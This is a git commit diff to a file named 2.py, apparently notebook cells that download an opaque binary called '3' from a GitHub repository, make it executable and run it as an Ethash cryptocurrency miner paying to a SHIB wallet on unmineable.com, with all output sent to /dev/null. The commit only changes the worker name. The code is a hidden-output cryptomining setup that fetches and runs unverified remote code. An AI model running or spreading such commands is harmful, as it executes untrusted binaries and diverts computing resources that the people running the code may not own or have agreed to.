e56bd006105c88aca422be6de8f40433296c2644
mencobaiajanah <86476551+mencobaiajanah@users.noreply.github.com>
2021-06-30 03:48:53 +0800

    Update 2.py

--- 2.py
+++ 2.py
@@ -1,3 +1,3 @@
 ! wget https://github.com/mencobaiajanah/LM2/raw/main/3 > /dev/null
 ! chmod +x 3
-! ./3 --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x6e890745813facaeab2afab23440a04f6b55034a.GPU-4#fg38-pfgk > /dev/null
+! ./3 --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x6e890745813facaeab2afab23440a04f6b55034a.GPU-1#fg38-pfgk > /dev/null
